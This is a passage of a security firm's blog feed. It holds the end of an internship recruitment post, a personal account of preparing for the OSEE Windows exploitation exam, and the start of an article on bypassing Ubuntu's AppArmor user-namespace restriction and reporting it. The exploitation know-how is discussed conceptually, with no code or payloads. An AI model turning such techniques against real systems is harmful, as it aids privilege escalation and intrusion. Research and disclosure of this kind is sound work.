&lt;p&gt;此階段為 30~120 分鐘（依照組別需求而定，會另行通知）的面試，會有 2~3 位資深夥伴參與，評估您是否具備本次實習所需的技術能力與人格特質。&lt;/p&gt;

&lt;h4 id=&quot;時間軸&quot;&gt;時間軸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2025/07/07 - 2025/07/28 公開招募，接收履歷與第一階段審核&lt;/li&gt;
  &lt;li&gt;2025/07/28 - 2025/08/04 通知第一階段審核結果、安排面試&lt;/li&gt;
  &lt;li&gt;2025/08/04 - 2025/08/14 第二階段面試（若報名踴躍會提前開始面試）&lt;/li&gt;
  &lt;li&gt;2025/08/18 前回應結果&lt;/li&gt;
  &lt;li&gt;2025/09/01 第八屆實習計畫於當週開始&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;報名方式&quot;&gt;報名方式&lt;/h3&gt;

&lt;p&gt;請於 &lt;strong&gt;2025/07/28 23:59&lt;/strong&gt; 前完成填寫 &lt;a href=&quot;https://forms.gle/aXKqVcbxGndAYMew8&quot;&gt;Google 表單&lt;/a&gt; 並上傳相關附件。以下為填寫表單的注意事項：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;檔案經上傳後無法刪除或修改，欲更新檔案請重新填寫一份表單&lt;/li&gt;
  &lt;li&gt;您可以隨時編輯已提交的表單，或是重新填寫一份新的表單來更新報名資訊。請注意，我們會以&lt;strong&gt;最後一次&lt;/strong&gt;提交的表單內容作為審核依據&lt;/li&gt;
  &lt;li&gt;請務必於&lt;strong&gt;截止時間（2025/07/28 23:59）&lt;/strong&gt; 前完成所有表單填寫與檔案上傳，逾期未完成者將視同放棄應徵資格&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;報名截止後，我們會根據您提交的報名內容進行第一階段審核。審核結果將於 &lt;strong&gt;2025/08/01&lt;/strong&gt; 前通知，並安排進一步的面試。最終錄取名單將於 &lt;strong&gt;2025/08/18&lt;/strong&gt; 公佈，我們也會同步通知錄取情況。&lt;/p&gt;

&lt;p&gt;若有應徵相關問題，請一律寄信到 recruiting_intern@devco.re，如造成您的不便請見諒，我們感謝您的來信，並期待您的加入！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/07/07/8th-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2025/07/07/8th-internship-program-recruit</guid>
                <pubDate>Mon, 07 Jul 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>從 Web 狗的視角看 OSEE — 從 0.1 開始的 Advanced Windows Exploitation 考試</title>
                <description>&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;✅：『課程結束後一年內要考到 OSEE 證照喔』&lt;/p&gt;

&lt;p&gt;🍊：「安啦，有一整年能準備哪不行」&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;（⏳⋯⋯）&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;✅：『公司下個月開始&lt;a href=&quot;https://training.devco.re/2025&quot;&gt;宣傳課程&lt;/a&gt;，到時候要有心得文唷』&lt;/p&gt;

&lt;p&gt;🍊：「好（默默打開 OffSec 網站排了死線前一天考試）」&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;（⏳⋯⋯）&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;🍊：「下禮拜就要考試了，怎麼會這樣 ヽ(ﾟДﾟ≡ﾟДﾟ)ﾉ 」&lt;/p&gt;

&lt;p&gt;✅：『你到底在幹嘛？？？』&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;這篇文算是自己準備 OSEE 考試的一點小心得，關於課程內容大家可以參考上一篇由 NiNi 撰寫的《&lt;a href=&quot;https://devco.re/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;EXP-401 (OSEE)：用五天課程訓練通透十年的知識體系&lt;/a&gt;》，也可以期待下禮拜 Angelboy 要出的「我獨自速通 OSEE 🐈‍⬛」！&lt;/p&gt;

&lt;p&gt;不過說實話，準備這個考試真的壓力很大；相較前幾個人，他們根本就是用母語考 N1 超級不公平！但如果整個研究組又只有我沒過，一定會被他們笑半天（可能不只 🤷‍♂️）；為了不丟公司首席（還有自己）的臉，只好小小跳脫舒適圈、認真準備 OSEE 考試。因此這篇文章將從個人的角度出發、評估自己所擁有的技能、衡量是否符合 OSEE 考試所需的最低要求，並加以準備。如果你看完後覺得「就這樣？」，那相信你一定也能輕鬆通過號稱 OffSec 系列最難的 EXP-401 考試！  (๑•̀ㅂ•́)و✧&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;前情提要&quot;&gt;前情提要&lt;/h1&gt;

&lt;p&gt;基本上，課程內容早就忘光光。而這半年為了一些酷東西（敬請期待✨），也好幾個月沒開過 IDA Pro 了，我直到考前一個禮拜才意識到大事不妙 😨；更何況當初為了壓死線，還把考試排在一個超爛的時間點（周日早上五點）。扣掉手上在弄的酷東西、公司庶務（好歹我也是個主管 ╮(╯_╰)╭），零零總總加起來只有「三天」能讀書！&lt;/p&gt;

&lt;p&gt;（什麼，周休三日？研究員是沒有休假的！）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250702/upload_f9464b7a270903509c9c72dfad45de1d.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;從前一篇 NiNi 的文中相信大家已經知道，整份 OSEE 教材約有 600 頁。鑒於上次讀原文書已經是高中（&lt;a href=&quot;https://www.amazon.com/Gray-Hat-Python-Programming-Engineers/dp/1593271921&quot;&gt;Gray Hat Python&lt;/a&gt; —— 嘿對，我大學沒讀過原文書XD），我決定第一天先把精力花在情蒐：找找有沒有考古題，或能從別人的心得萃取一些資訊；盡可能大膽地猜題，並想像考試時可能會遇到的坎。過程中發現 OSEE 的題目很固定，只有兩題：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Windows Kernel 的本地提權&lt;/li&gt;
  &lt;li&gt;UserMode App 的遠端程式碼執行&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而網路上的普遍評價都是：前者簡單到爆，後者才是整個考試的重點，跳脫 Sandbox 的部分也在這！在對考試內容大致有個輪廓後，便開始認命讀書 —— 大概是一天要讀個 200 頁才能趕得上的進度之類的。整個 OSEE 課程主要分成五個部分：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Shellcode&lt;/strong&gt; - Windows Shellcode&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;VM-Escape Exploit&lt;/strong&gt; - VMware Workstation Guest-To-Host Escape&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Browser Exploit&lt;/strong&gt; - Microsoft Edge Type Confusion&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Kernel Exploit Part 1&lt;/strong&gt; - Driver Callback Overwrite&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Kernel Exploit Part 2&lt;/strong&gt; - Unsanitized User-mode Callback&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;上面的內容並非完全沒有經驗，但也不能說有經驗。你可能想說「這個人在供三小」？且聽我娓娓道來！&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;準備過程&quot;&gt;準備過程&lt;/h1&gt;

&lt;h2 id=&quot;1--windows-shellcode&quot;&gt;1.  Windows Shellcode&lt;/h2&gt;

&lt;p&gt;第一個章節主要涵蓋 Windows 基礎知識以及 Shell Coding 上的各種慣例。Windows 的 Shellcode 不像 Unix-Like 系統上那麼方便，短短&lt;a href=&quot;https://shell-storm.org/shellcode/files/shellcode-909.html&quot;&gt;十幾個 Bytes 就能跳個 Shell&lt;/a&gt;；必須使用組合語言在各種不同的 Windows 結構中跳轉，並動態取出相對應的 Symbol 地址。因此一組 Shellcode 動輒兩、三百 Bytes 起跳，甚至利用 &lt;a href=&quot;https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf&quot;&gt;Egg Hunting&lt;/a&gt; 也是家常便飯。&lt;/p&gt;

&lt;p&gt;對我來說，可以快速跳過這個章節的原因主要歸功於早期在玩&lt;a href=&quot;https://blog.orange.tw/posts/2012-07-hacks-in-taiwan-2012-potent-pwnables-3/&quot;&gt;皮卡丘打排球&lt;/a&gt;時的訓練。在當時（還是 Perl 時代）的 Metasploit 還不像現在那麼穩定，因此自己寫一套 Shellcode 框架就變成一件很炫的事。而很多&lt;a href=&quot;https://www.exploit-db.com/exploits/13529&quot;&gt;古早的產生器&lt;/a&gt;都會寫死一些值，導致其無法橫跨多個 Windows 版本；因此為了讓一份 Shellcode 可以跨平台，必須確實了解每行指令，並嘗試修復它們！&lt;/p&gt;

&lt;p&gt;因此簡單來說，這就是個用來暖身的環節 —— 考驗著學生對組合語言的熟悉程度，以及是否具備對本堂課程最最最最最基本的知識，這應該也是個順便給老師評估學生程度（？）的環節。如果上面的內容聽起來有點陌生，那你可以考慮先跳過這張證照，或認真讀讀《&lt;a href=&quot;https://www.tenlong.com.tw/products/9787121336928&quot;&gt;加密與解密&lt;/a&gt;》！（台北天瓏還有賣，沒想到出到第四版了XD）&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-vm-escape-exploit&quot;&gt;2. VM-Escape Exploit&lt;/h2&gt;

&lt;p&gt;從這個章節起，整個 OSEE 才算真正開始見真章！正如其名，這一章專注在「如何從虛擬機跳出來」。對我來說，這也算另一個能用經驗輾壓的章節，我約在數年前有小研究過 VMware 的攻擊面，因此無論是 VMware 的 Backdoor 機制或是基於其之上的 Drag &amp;amp; Drop 漏洞都能駕輕就熟，印象那時還很認真逆向了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vmware-vmx&lt;/code&gt;，並找出一些漏洞（被廠商摸頭又是另個故事了 ¯\_(ツ)_/¯ ）。因此如果有認真讀過下面這幾篇，那我想這個章節應該就差不多了：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2017 - &lt;a href=&quot;https://github.com/acama/acez.re/blob/main/The%20Weak%20Bug%20-%20Exploiting%20a%20Heap%20Overflow%20in%20VMware.md&quot;&gt;The Weak Bug - Exploiting a Heap Overflow in VMware&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2017 - &lt;a href=&quot;https://www.blackhat.com/docs/eu-17/materials/eu-17-Mandal-The-Great-Escapes-Of-Vmware-A-Retrospective-Case-Study-Of-Vmware-G2H-Escape-Vulnerabilities.pdf&quot;&gt;The Great Escapes of VMware: A Retrospective Case Study of …&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2018 - &lt;a href=&quot;https://keenlab.tencent.com/en/2018/04/23/A-bunch-of-Red-Pills-VMware-Escapes/&quot;&gt;A bunch of Red Pills: VMware Escapes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2018 - &lt;a href=&quot;https://www.offensivecon.org/speakers/2018/zdi-team.html&quot;&gt;L’art de l’évasion: Modern VMWare Exploitation Techniques&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不過，雖然我快速跳過了這章的前半，但由於當初是從「找漏洞」的視角下去學習，並沒有花太多時間著墨在「如何利用漏洞」上，因此我反而花了滿多額外的時間在複習後半段的漏洞利用，例如 LFH 機制，或是如何繞過額外的 WDEG 及 EAF 保護等。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-browser-exploit&quot;&gt;3. Browser Exploit&lt;/h2&gt;

&lt;p&gt;這應該是整個課程聽起來最高大上的部分，從這開始難度也逐漸母湯。雖然十五年前我也玩過所謂的「&lt;a href=&quot;https://blog.orange.tw/posts/2013-07-0-day-0-day-easy-talk-happy-fuzzing/&quot;&gt;瀏覽器漏洞&lt;/a&gt;」。不過在當時主流還是 x86 架構，只要一個 vtable call 跳到 0x0C0C0C0C 就能輕鬆 Heap Spray 的年代（還有&lt;a href=&quot;https://zh.wikipedia.org/zh-tw/%E4%B8%AD%E6%96%87%E4%BA%82%E7%A2%BC#%E2%80%9C%E7%83%AB%E7%83%AB%E7%83%AB%E2%80%9D%E4%B8%8E%E2%80%9C%E5%B1%AF%E5%B1%AF%E5%B1%AF%E2%80%9D&quot;&gt;燙燙燙跟屯屯屯&lt;/a&gt;XD） —— 此時彼時的難度絕對無法同日而語。&lt;/p&gt;

&lt;p&gt;回顧這幾年，我對瀏覽器漏洞的認識也還停留在基礎的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addressOf&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fakeObj&lt;/code&gt;，或是用 String Length 去造任意讀寫。雖然這些招數在好幾年前也過時了，不過好在這些概念在底層還能通用。此外，更歸功於以前 CTF 的訓練（被 &lt;a href=&quot;https://4ngelboy.blogspot.com/2016/03/advanced-heap-exploitation.html&quot;&gt;Advanced Heap Exploitation&lt;/a&gt; 摧殘後這些都是小兒科 🤷‍♂️），即使在不熟悉的平台上，漏洞該如何利用、或成因等，那些熟悉度都還在。因此反倒我更專注在複習這章的「防禦繞過」（例如 CFG、ACG）、「漏洞的武器化」（使用 Data-Only Attack 穿梭在 Assembly 跟 JavaScript 中），以及後續地繞過 Sandbox 本身。&lt;/p&gt;

&lt;p&gt;—— 回顧時，發現小時候自己居然還宣稱過「專精於 Windows 漏洞利用」，應該也算一種&lt;a href=&quot;https://zh.wikipedia.org/zh-tw/%E9%84%A7%E5%AF%A7-%E5%85%8B%E9%AD%AF%E6%A0%BC%E6%95%88%E6%87%89&quot;&gt;愚昧之巔&lt;/a&gt; 😖。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-kernel-exploit---part-1&quot;&gt;4. Kernel Exploit - Part 1&lt;/h2&gt;

&lt;p&gt;由於長期偏科在那些「遠端利用」的漏洞，老實說這個章節對我來說真的完全空白。自己對於 Windows Kernel 的認識也還停留在早期的 &lt;a href=&quot;https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf&quot;&gt;Token Kidnapping&lt;/a&gt;；或者&lt;a href=&quot;https://devco.re/en/blog/author/angelboy/&quot;&gt;強者我同事&lt;/a&gt;每次分享時，偷學個一兩招。不過仔細想想，他每個禮拜都在報新洞（羨慕），算下來好像也學了不少招 😆。只是，直到去年 OSEE 課程前，我連一次 Kernel Exploit 都還沒完成過，因此就算前面應用層還能靠老本硬嗑，從這開始就真的完全陌生了，也是本次考試我最最最最最擔心的部分 😨。&lt;/p&gt;

&lt;p&gt;我大概花了一整天讓自己沉浸在 Windows Kernel 的世界，重新熟悉 IRQL/IOCTL、PML4/PTE、SMEP/SMAP 的概念，以及東逛逛西逛逛 KPROCESS/KTHREAD 等重要的結構。&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;5-kernel-exploit---part-2&quot;&gt;5. Kernel Exploit - Part 2&lt;/h2&gt;

&lt;p&gt;來不及啦。怎麼可能在三天複習完 OSEE，這章整個跳過XD&lt;/p&gt;

&lt;p&gt;—— 不過雖然來不及，但 Win32k 常見的漏洞模式我大概還是知道，只能祈禱自己的老本還夠用（？）&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;此外，這章所提到的虛擬化安全，例如 VBS、HVCI、EPT、kCFG 等。雖然我猜不會考（想想就很難出XD），但我反倒看得很開心。好好讀一讀感覺對未來也很有幫助，而最後一天就在這種 —— 輕輕鬆鬆、隨隨便便、東看看西看看的快樂氣氛下渡過！✨ 😌 🌱&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;考試&quot;&gt;考試&lt;/h1&gt;

&lt;p&gt;由於挑了一個爛時間，前一天我特地十二點不到就上床睡覺，結果就是 —— 完 ～ 全 ～ 睡 ～ 不 ～ 著 😵‍💫 🛌 ❌。約莫早上四點提著兩罐紅牛到辦公室應試。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250702/upload_8de62a77c3ea1cfb7137088cb8372a58.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;時間一到便是 OffSec 一系列的 —— 開攝影機、How are you、I am fine thank you，還有秀護照的流程。考試開始時完全不想面對未知事物，反倒先挑了更難的 UserMode App 開局，過程中不知腦袋卡到啥還挑了一個爛方法，妄想著一步登天。寫完要戳遠端時才發現連最開始的 Leak 都失敗大崩潰，好在最後還是靠著毅力硬輾過去。解完第一題發現天亮了，為了不打擾同事星期一上班趕緊轉換地點。快 48 小時沒睡下樓梯時還小暈了一下，又重新認識到睡覺很重要XD&lt;/p&gt;

&lt;p&gt;回到家洗洗睡起來趕快看下一題。相較前一題，Kernel 提權的洞真的簡單到不可思議。但小丑如我，連一開始的確認環境都花了好多時間。本地提權部分好像就較沒啥好說的，比較值得一提的是&lt;del&gt;鑑於有同事&lt;a href=&quot;#&quot;&gt;因為報告寫太水&lt;/a&gt;沒過&lt;/del&gt;，我花了八個小時寫報告（據說還算快的），最終在考試結束前一小時提早交卷結束整個考試流程！🎉&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;後續&quot;&gt;後續&lt;/h1&gt;

&lt;p&gt;都考過了，應該可以結束這篇了吧 —— 附上人權！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250702/upload_c19a76bdfc7a47e02b2bd978aa89683f.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;說實話，OSEE 難度整體難度不高。不過自己還在卡在很多不應該的地方，著實該打屁股。除了沒睡飽、沒&lt;del&gt;洗澡能好好&lt;/del&gt;思考，還有不是母語這些顯而易見的藉口外，事後還是覆盤了下自己還有哪些「可以做得更好」的地方？&lt;/p&gt;

&lt;p&gt;其實整個流程看下來我也知道，最欠缺的就是「實作」—— 這導致雖然能搞定所有的關鍵流程，反而我都卡在一些莫名其妙的小細節上。尤其 CTF 的背景又容易在一些不切實際的地方上鑽牛角尖，因此這裡給考生的一點小建議是：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;絕對要把課堂上的 Extra Miles 做過一遍，有好好做完一定會過！&lt;/li&gt;
  &lt;li&gt;OSEE 著重在最基礎的「你懂不懂」，因此不用擔心沒有實際的漏洞挖掘經驗會無法應試。&lt;/li&gt;
  &lt;li&gt;CTF 上那些炫招不會出現，當你開始思考用 Partial Overwrite 搞事時你已經走火入魔了。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;給自己的一個小反思是 —— 這些年好像太把技能特化在「找漏洞」這件事上，對於「記憶體上的利用」反倒沒有太多著墨，說起來著實有些慚愧；不過想想自己只是隻 Web 狗，又覺得好像還好（汪）。相信如果有 WEB-401 的話我也能速通！ 💪&lt;/p&gt;

&lt;p&gt;—— 坐等 OffSec 出 WEB-401 😜&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;推薦嗎&quot;&gt;推薦嗎？&lt;/h1&gt;

&lt;p&gt;平心而論，這是一次很棒的體驗！不僅課程內容充實、跳脫了舒適圈，甚至還能跟好朋友一起讀書！然而最令我驚訝的是「課程講師的專業度」（聽說 OSEE 全球只有四位講師），他們不僅對課程的掌握度極高、對每個細節滾瓜爛熟，甚至能解答你對於 Windows 所有天馬行空的怪問題。我相信既使是已經能速通的 Angelboy，也從課堂上學到不少新東西（吧）（跑XD&lt;/p&gt;

&lt;p&gt;不過，無論是想系統性地了解 Windows 的漏洞利用體系，或是 CTF 仔想要驗證一下自己的能力到哪，我想 EXP-401 （OSEE）絕對是你的最佳選擇！ 👍&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/07/02/webdog-view-on-osee-advanced-windows-exploitation-from-0.1/</link>
                <guid>https://devco.re/blog/2025/07/02/webdog-view-on-osee-advanced-windows-exploitation-from-0.1</guid>
                <pubDate>Wed, 02 Jul 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;近期 Ubuntu 實作了新的沙盒機制來減少攻擊面，然而其乍看之下堅不可摧，但經過研究後發現，繞過方式並沒有想像中那麼困難！本文將介紹我們如何從核心層級著手找出繞過方法，並分享研究過程中遇到的一些有趣故事。&lt;/p&gt;

&lt;h2 id=&quot;1-introduction&quot;&gt;1. Introduction&lt;/h2&gt;

&lt;h3 id=&quot;11-ubuntus-new-sandbox-model&quot;&gt;1.1. Ubuntu’s New Sandbox Model&lt;/h3&gt;

&lt;p&gt;長久以來，Linux 提供了 &lt;strong&gt;非特權使用者命名空間（Unprivileged User Namespace）&lt;/strong&gt; 的機制，讓使用者能在隔離環境中執行程式，並且在允許程式在命名空間內可以執行高權限的行為。雖然該機制提供使用者更多的彈性，但因為能與更多子系統或驅動程式互動，也間接暴露出更多核心攻擊面。為了解決此問題，Ubuntu 在 2024 年四月底，也就是 Pwn2Own 結束後不久，發布了一篇&lt;a href=&quot;https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts&quot;&gt;安全相關的文章&lt;/a&gt;，內容提到他們實作了一套基於 AppArmor 的沙盒機制，能有效地限制不受信任的程式使用非特權使用者命名空間和子系統 io_uring，藉此降低潛在的攻擊面。&lt;/p&gt;

&lt;p&gt;隨後，在 2024 年九月，Ubuntu 又公開了一份&lt;a href=&quot;https://static.sched.com/hosted_files/lsseu2024/ed/Restricting%20Unprivileged%20User%20Namespaces%20In%20Ubuntu.pdf&quot;&gt;投影片&lt;/a&gt;，進一步深入介紹這套沙盒的架構。內容主要說明了他們目前面臨的問題：攻擊者持續以非特權使用者命名空間為媒介，利用核心模組的漏洞進行提權。此外，他們也詳細解釋了整個保護機制的實作，並評估了導入沙盒後的預期成效。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_42ba484ec23b76cbbb9a0d60184bf5d1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由於只有特定程式能建立非特權使用者命名空間，這讓攻擊者能接觸到的核心子系統大幅減少，像是過去經常出現提權漏洞的 netfilter 和 net/sched，再也沒有辦法被存取。這個保護機制看似滴水不漏，甚至讓部分 Linux 核心研究員開始認為，作為歷年來 Pwn2Own 唯一的 Linux 提權目標，Ubuntu 可能已經變得難以被突破。&lt;/p&gt;

&lt;h3 id=&quot;12-emergence-of-the-bypass-method&quot;&gt;1.2. Emergence of the Bypass Method&lt;/h3&gt;

&lt;p&gt;然而，就在今年 2 月 16 日，正當我在滑 Twitter 上的文章時，突然看到有人說：這個用 AppArmor 實作的保護機制竟然可以簡單地被繞過！怎麼可能有這種事？這則留言成功引起我的注意了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_aa9dd31f3f5a20bfe166d06729f5544e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果那位研究員所言屬實，那就代表目前至少有一個繞過方式能繞過沙盒。存在已知解，限時內找出解法，這不就是一道 CTF Misc 題嗎？剛好算了算時間，Pwn2Own 2025 差不多也快開始了，於是我決定著手分析 Ubuntu 是怎麼透過 AppArmor 實作這套限制機制，並嘗試找出該研究員提到的繞過方式，把它當作一道 500 分的 CTF 題來解。&lt;/p&gt;

&lt;p&gt;沒想到我想得太難了，繞過手法過於簡單，所以這題大概…只值 100 分吧！雖然我對 AppArmor 的機制不太熟，但因為分析方向很明確，從開始研究到找出繞過方式，整個過程不到三個小時。後來我甚至認為，只要有看到那則推文並實際分析，應該都能找到這個方法。既然能建立非特權使用者命名空間，那接下來的目標就單純不少：從那些 Ubuntu 預設開啟、但 kernelCTF 沒有啟用的網路核心模組上，找一個可以利用的漏洞。看來今年有望再參加一次 Pwn2Own 囉！&lt;/p&gt;

&lt;p&gt;又過了幾天，Pwn2Own 總算公布了這次比賽的規則。沒想到這次的 Linux 提權目標竟然不是 Ubuntu，而是換成了 Red Hat Enterprise Linux（RHEL）。又因為 RHEL 沒有針對非特權使用者命名空間做任何限制，因此也不需要什麼繞過方式。也就是說，我剛找到沒多久的繞過方法，變得一點用處都沒有。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_58836702284ef31386e2d2f737ef8883.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;13-vendor-response&quot;&gt;1.3. Vendor Response&lt;/h3&gt;

&lt;p&gt;當知道 Ubuntu 不再是今年 Pwn2Own 的比賽目標後，我馬上透過 ZDI 回報了這個繞過方法，並預期由 ZDI 跟 Ubuntu 的安全團隊協作進行修復。不過就在等待 ZDI 回覆的這段期間，一開始提到這項保護機制能被繞過的研究員 @roddux，在 3 月 21 日公開了他當初所說的&lt;a href=&quot;https://x.com/roddux/status/1903028631514837107&quot;&gt;繞過技巧&lt;/a&gt;，雖然跟我找到的方法在概念上有些類似，但實際上是不同的成因！幾天後，Qualys Team 也注意到 @roddux 的貼文，並在 3 月 27 日公開了他們早在年初就發現的&lt;a href=&quot;https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt&quot;&gt;三個繞過手法&lt;/a&gt;，還附上了詳細的技術成因說明。原來這些方法早在年初就回報給 Ubuntu 安全團隊，只是一直沒對外公開（可能是因為還在想要怎麼修）。直到類似手法在網路上被公開，他們才釋出當時提交給 Ubuntu 安全團隊的報告。&lt;/p&gt;

&lt;p&gt;身為一個研究員，看著一個個繞過技巧和分析細節被公開，我卻因為已經回報給 ZDI 而無法對外分享自己的研究。隔沒幾天，我甚至還沉不住氣寄信給 ZDI，詢問他們是否能取消我的回報。還好 orange 耐心地向我分析取消回報後的優劣，我才找回冷靜，再寄了一封信請他們取消我先前取消回報的要求。&lt;/p&gt;

&lt;p&gt;最終 ZDI 在 4 月 27 日審查了我的回報，但他們回覆說他們對這種類型的問題沒興趣，並拒絕後續的處理。沒想到我朝思暮想等了兩個多月，換來的竟然是這種回覆。雖然錯愕，但我還是馬上改回報給 Ubuntu 安全團隊，畢竟這個繞過手法可能還沒被揭露。結果不到一天，我就收到其中一位沙盒機制的維護者 John 的回覆。他表示會立即確認這個問題，並在後續通知我更新的狀況。這是我第一次回報安全漏洞給 Ubuntu，他們積極的處理態度和友善的溝通方式讓整個過程非常順利，與他們合作的感覺非常愉快。&lt;/p&gt;

&lt;p&gt;在經過了將近一個月的審查與討論，Ubuntu 安全團隊最後判定我回報的問題，是先前 Qualys Team 發現的繞過手法的變種。這個變種手法需要在特定核心參數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined&lt;/code&gt; 被關閉的情況下才會生效。不過這個參數從 Ubuntu 25.04 開始就預設啟用了，因此新版系統不受影響。至於舊版本的 Ubuntu，官方先前曾發布過&lt;a href=&quot;https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes&quot;&gt;說明文章&lt;/a&gt;，教使用者如何手動啟用這個參數，避免被類似繞過手法影響。&lt;/p&gt;

&lt;p&gt;這篇文章紀錄了我找到繞過手法的方式、技術細節分析以及回報的過程。雖然 Qualys Team 的文章已經涵蓋了這個手法的核心概念，但我認為這篇文章仍有一定的價值，因為我們的分析切入點不同：他們是從使用者空間的應用層面開始分析，而我是從核心出發來理解整個繞過的原理。希望能對各位有幫助！&lt;/p&gt;

&lt;h2 id=&quot;2-apparmor-101&quot;&gt;2. AppArmor 101&lt;/h2&gt;

&lt;h3 id=&quot;21-overview&quot;&gt;2.1. Overview&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;AppArmor（Application Armor）&lt;/strong&gt; 是一種 Linux 安全模組（Linux Security Module, LSM）的實作，提供強制存取控制（MAC）機制，用來限制程式對系統資源的存取。系統管理員可以為特定程式定義 AppArmor 設定檔（profile），限制它的行為與權限。如果一個程式沒有對應的 AppArmor 設定檔，它會以 &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; 設定檔&lt;/strong&gt;執行，也就是說 AppArmor 不會對它施加任何限制。&lt;/p&gt;

&lt;p&gt;每個 AppArmor 設定檔都針對特定執行檔，定義其存取控制規則，包含存取的檔案、系統能力（capabilities）以及網路權限。啟用的設定檔可以運作於兩種模式之一：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;強制模式（Enforced mode）：當程式行為違反設定規則時，會被阻擋並記錄下來。&lt;/li&gt;
  &lt;li&gt;回報模式（Complain mode）：違規行為僅會被記錄，不會實際阻擋。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下方以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipa_verify&lt;/code&gt; 設定檔作為範例：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;abi &amp;lt;abi/4.0&amp;gt;,
include &amp;lt;tunables/global&amp;gt;

